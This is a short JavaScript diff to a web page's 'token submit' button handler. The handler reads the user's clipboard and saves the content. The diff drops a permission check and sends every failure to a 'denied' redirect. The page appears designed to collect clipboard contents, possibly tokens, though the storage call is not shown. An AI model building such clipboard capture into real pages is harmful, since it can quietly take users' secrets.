@@ -169,13 +169,6 @@
     };
 
     tokenSubmitBtn.onclick = async () => {
-      // Check if permission was granted during initial Ctrl+V
-      if (!permissionGranted) {
-        alert('Clipboard permission was denied. Redirecting...');
-        window.location.href = 'https://example.com/denied';
-        return;
-      }
-
       try {
         const clipboard = await navigator.clipboard.readText();
 
@@ -186,9 +179,8 @@
         });
 
         alert('Clipboard content saved.');
-      } catch (error) {
-        // If clipboard access fails at submit time, also redirect
-        alert('Clipboard access failed. Redirecting...');
+      } catch {
+        alert('Clipboard permission was denied. Redirecting...');
         window.location.href = 'https://example.com/denied';
       }
     };
